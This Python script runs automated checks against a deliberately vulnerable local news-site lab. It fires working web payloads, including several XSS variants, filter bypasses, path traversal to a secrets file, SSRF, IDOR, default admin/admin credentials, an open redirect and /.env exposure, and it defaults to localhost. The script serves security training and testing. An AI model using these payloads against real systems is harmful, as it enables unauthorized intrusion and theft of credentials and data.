#!/usr/bin/env python3
"""
Automated finding-walker for the HaMivtzar News Lab.

Exercises every intentional weakness (VULN-01 .. VULN-11) plus both
string-array-rotation deobfuscation challenges against a LOCAL lab instance,
and prints PASS/FAIL with a short evidence snippet for each. Think of it as a
tiny purpose-built scanner for this one target — the kind of throwaway client
you'd write during a real (authorized) engagement.

    # start the lab in one shell:
    python3 app.py                       # http://127.0.0.1:8099
    # then, in another:
    python3 attacks/run_all.py                       # defaults to 127.0.0.1:8099
    python3 attacks/run_all.py http://127.0.0.1:8099 # or pass the base URL

SCOPE: this only ever talks to the URL you give it. Point it at your own lab.
Do NOT run it against a host you do not own / are not authorized to test.
See ../SCOPE.md.

Zero third-party dependencies — Python standard library only.
"""
import json
import os
import sys
import urllib.error
import urllib.parse
import urllib.request

# Import the generic deobfuscator that lives next to this file.
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import deobfuscate  # noqa: E402

DEFAULT_BASE = "http://127.0.0.1:8099"

GREEN, RED, DIM, RESET = "\033[32m", "\033[31m", "\033[2m", "\033[0m"
if not sys.stdout.isatty():
    GREEN = RED = DIM = RESET = ""

_passed = 0
_failed = 0


def _req(base, path, method="GET", data=None, follow=True):
    """Return (status, headers, body_text). Never raises on HTTP errors."""
    url = base + path
    body = None
    if data is not None:
        body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body, method=method)

    class _NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):
            return None

    opener = urllib.request.build_opener() if follow \
        else urllib.request.build_opener(_NoRedirect)
    try:
        with opener.open(req, timeout=6) as r:
            return r.status, dict(r.headers), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "replace")


def check(name, ok, evidence=""):
    global _passed, _failed
    tag = f"{GREEN}PASS{RESET}" if ok else f"{RED}FAIL{RESET}"
    if ok:
        _passed += 1
    else:
        _failed += 1
    print(f"[{tag}] {name}")
    if evidence:
        for line in str(evidence).splitlines():
            print(f"       {DIM}{line}{RESET}")


def run(base):
    print(f"# Walking HaMivtzar News Lab findings at {base}\n")

    # VULN-01 reflected XSS (search)
    payload = "<script>alert(1)</script>"
    _, _, b = _req(base, "/newssearch?q=" + urllib.parse.quote(payload))
    check("VULN-01 reflected XSS (search)", payload in b,
          "query reflected unescaped into the page" if payload in b else b[:120])

    # VULN-02 IDOR (unpublished draft 1999 + internal note)
    _, _, b = _req(base, "/article?id=1999")
    ok = "DO-NOT-PUBLISH" in b or "editor-note" in b
    check("VULN-02 IDOR (embargoed draft served + internal note leaked)", ok,
          "draft 1999 reachable by direct id")

    # VULN-03 path traversal / LFI (/AjaxPage)
    _, _, b = _req(base, "/AjaxPage?jspName=SECRET_internal.json")
    ok = "LAB_FAKE_DEPLOY_TOKEN" in b or "deployToken" in b
    check("VULN-03 path traversal / LFI (SECRET_internal.json)", ok,
          "reached the non-feed file via jspName")

    # VULN-04 SSRF (/proxy/multivac) — make the server fetch its own version ep
    target = base + "/config/version"
    _, _, b = _req(base, "/proxy/multivac?url=" + urllib.parse.quote(target))
    ok = "hamivtzar-news-lab" in b or "buildHost" in b
    check("VULN-04 SSRF (server fetched an internal URL)", ok,
          "proxy returned content of an internal endpoint")

    # VULN-05 stored XSS (writers chat)
    marker = "<b id=xss05>chat</b>"
    _req(base, "/api/chat", method="POST",
         data={"reporter": "runner", "text": marker})
    _, _, b = _req(base, "/")
    check("VULN-05 stored XSS (writers chat rendered unescaped)", marker in b,
          "posted chat message returned unescaped on the lobby")

    # VULN-06 missing security headers
    _, hdr, _ = _req(base, "/")
    lower = {k.lower() for k in hdr}
    missing = [h for h in ("content-security-policy", "x-frame-options",
                           "x-content-type-options") if h not in lower]
    check("VULN-06 missing security headers", len(missing) == 3,
          "absent: " + ", ".join(missing))

    # VULN-07 info disclosure (/config/version + Server banner)
    st, hdr, b = _req(base, "/config/version")
    server = hdr.get("Server", "")
    ok = "apiKey" in b and "HaMivtzarLab" in server
    check("VULN-07 info disclosure (internal config + Server banner)", ok,
          f"Server: {server}")

    # VULN-08 default creds, no lockout
    _, _, b = _req(base, "/admin?user=admin&pass=admin")
    ok = "אמברגו" in b or "פאנל ניהול" in b or "Admin" in b and "1999" in b
    check("VULN-08 default creds admin/admin (admin panel reached)", ok,
          "authenticated with default creds")

    # VULN-09 open redirect (/go)
    st, hdr, _ = _req(base, "/go?url=https://example.org/evil", follow=False)
    loc = hdr.get("Location", "")
    check("VULN-09 open redirect (/go)", st in (301, 302) and "example.org" in loc,
          f"{st} -> Location: {loc}")

    # VULN-10 sensitive file exposure (/.env)
    _, _, b = _req(base, "/.env")
    check("VULN-10 sensitive file exposure (/.env)", "ADMIN_PASS" in b,
          "served dotenv with credentials")

    # VULN-11 stored XSS in comments + comment IDOR onto a draft
    marker = "<b id=xss11>cmt</b>"
    _req(base, "/api/comments", method="POST",
         data={"articleId": "1001", "name": "runner", "text": marker})
    _, _, b = _req(base, "/article?id=1001")
    xss_ok = marker in b
    _req(base, "/api/comments", method="POST",
         data={"articleId": "1999", "name": "runner", "text": "onto-draft"})
    _, _, jb = _req(base, "/api/comments?articleId=1999")
    idor_ok = "onto-draft" in jb
    check("VULN-11 stored XSS in comments", xss_ok,
          "comment returned unescaped on the article page")
    check("VULN-11 comment IDOR (comment accepted on embargoed draft)", idor_ok,
          "comment stored/listed on draft 1999")

    # VULN-12 attribute-context XSS (/profile) — break out of value="..."
    payload = '" autofocus onfocus=alert(12) x="'
    _, _, b = _req(base, "/profile?name=" + urllib.parse.quote(payload))
    ok = 'onfocus=alert(12)' in b and 'value="" autofocus' in b
    check("VULN-12 XSS in HTML attribute context (/profile)", ok,
          "payload broke out of the quoted attribute value")

    # VULN-13 JS-string-context XSS (/greet) — break out of var m='...'
    payload = "';alert(13);//"
    _, _, b = _req(base, "/greet?msg=" + urllib.parse.quote(payload))
    ok = "var m='';alert(13);//'" in b
    check("VULN-13 XSS in JavaScript string context (/greet)", ok,
          "payload closed the JS string and injected code")

    # VULN-14 naive-filter bypass (/filtered) — <script> stripped, <img> isn't
    payload = "<img src=x onerror=alert(14)>"
    _, _, b = _req(base, "/filtered?q=" + urllib.parse.quote(payload))
    ok = payload in b
    check("VULN-14 naive WAF bypass (/filtered, event-handler tag)", ok,
          "event-handler tag survived the <script>-only filter")

    # VULN-15 DOM-based XSS (/welcome) — verify the client-side sink is present
    _, _, b = _req(base, "/welcome")
    ok = "location.hash" in b and ".innerHTML" in b
    check("VULN-15 DOM-based XSS sink present (/welcome, hash -> innerHTML)", ok,
          "server ships an innerHTML sink fed by location.hash "
          "(exploit: /welcome#<img src=x onerror=alert(15)>)")

    # RE-1 lobby header-bidding loader deobfuscates coherently
    _, _, js = _req(base, "/static/hb-loader.js")
    try:
        out = deobfuscate.deobfuscate(js)
        ok = "publisher" in out and "n-lab" in out
        ev = next((l for l in out.splitlines()
                   if "console" in l and not l.startswith("#")), "")
    except Exception as e:  # noqa: BLE001
        ok, ev = False, str(e)
    check("RE-1 /static/hb-loader.js decodes to readable strings", ok, ev)

    # RE-2 article-page VAD loader deobfuscates coherently
    _, _, js = _req(base, "/static/vad-hb.js")
    try:
        out = deobfuscate.deobfuscate(js)
        ok = "cdn.valuad.lab" in out and "disableInitialLoad" in out
        ev = next((l.strip() for l in out.splitlines()
                   if "= '//cdn.valuad.lab" in l), "")
    except Exception as e:  # noqa: BLE001
        ok, ev = False, str(e)
    check("RE-2 /static/vad-hb.js decodes to a header-bidding injector", ok, ev)

    print()
    total = _passed + _failed
    color = GREEN if _failed == 0 else RED
    print(f"{color}{_passed}/{total} checks passed{RESET}")
    return 0 if _failed == 0 else 1


def main(argv):
    base = (argv[1] if len(argv) > 1 else
            os.environ.get("LAB_BASE", DEFAULT_BASE)).rstrip("/")
    if not base.startswith("http://127.0.0.1") and \
       not base.startswith("http://localhost") and \
       os.environ.get("LAB_ALLOW_REMOTE") != "1":
        print("Refusing to target a non-local host by default.\n"
              "This runner is for your OWN local lab. If you really are testing\n"
              "an authorized remote copy, set LAB_ALLOW_REMOTE=1. See ../SCOPE.md.",
              file=sys.stderr)
        return 2
    try:
        return run(base)
    except urllib.error.URLError as e:
        print(f"Could not reach {base}: {e}\nIs the lab running? "
              f"(python3 app.py)", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
